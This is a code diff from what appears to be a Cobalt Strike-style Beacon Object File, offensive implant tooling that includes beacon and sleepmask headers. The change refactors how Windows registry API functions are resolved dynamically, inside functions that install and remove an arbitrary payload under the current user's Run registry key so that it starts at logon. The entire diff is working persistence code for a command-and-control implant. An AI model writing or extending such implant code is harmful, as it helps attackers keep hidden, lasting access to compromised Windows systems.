@@ -33,13 +33,23 @@ protected:
 #else
 #include "..\Core\beacon.h"
 #include "..\Core\sleepmask.h"
-DFR(KERNEL32, GetLastError);
+
+extern "C" {
+    DFR(KERNEL32, GetLastError);
+    DFR(ADVAPI, RegCreateKeyA);
+    DFR(ADVAPI, RegSetKeyValueA);
+    DFR(ADVAPI, RegCloseKey);
+    DFR(ADVAPI, RegOpenKeyExA);
+    DFR(ADVAPI, RegDeleteKeyA);
+}
 #define GetLastError KERNEL32$GetLastError
+#define RegCreateKeyA ADVAPI$RegCreateKeyA
+#define RegSetKeyValueA ADVAPI$RegSetKeyValueA
+#define RegCloseKey ADVAPI$RegCloseKey
+#define RegOpenKeyExA ADVAPI$RegOpenKeyExA
+#define RegDeleteKeyA ADVAPI$RegDeleteKeyA
 
 bool InstallRunKey(char* payload) {
-    DFR_LOCAL(ADVAPI, RegCreateKeyA);
-    DFR_LOCAL(ADVAPI, RegSetKeyValueA);
-    DFR_LOCAL(ADVAPI, RegCloseKey);
     HKEY hKey;
 
     //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
@@ -62,10 +72,6 @@ bool InstallRunKey(char* payload) {
 }
 
 bool RemoveRunKey() {
-    DFR_LOCAL(ADVAPI, RegOpenKeyExA);
-    DFR_LOCAL(ADVAPI, RegDeleteKeyA);
-    DFR_LOCAL(ADVAPI, RegCloseKey);
-
     HKEY hKey;
     //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
